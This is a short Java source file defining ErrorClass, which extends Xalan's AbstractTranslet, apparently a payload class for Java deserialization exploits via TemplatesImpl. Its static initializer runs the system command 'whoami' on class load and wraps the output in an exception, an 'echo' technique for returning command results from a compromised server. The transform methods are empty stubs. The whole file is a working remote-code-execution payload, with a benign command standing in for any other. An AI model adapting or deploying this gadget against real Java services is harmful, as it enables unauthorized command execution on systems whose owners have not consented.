package org.example.echo;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.BufferedReader;
import java.io.InputStreamReader;

public class ErrorClass extends AbstractTranslet {
    static {
        try {
            Process proc = Runtime.getRuntime().exec("whoami");
            BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = br.readLine()) != null) {
                sb.append(line).append("\n");
            }
            String result = sb.toString();
            throw new Exception(result);
        } catch (Exception e) {
            
        }
    }

    public ErrorClass(){
        System.out.println("ErrorClass");
    }


    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
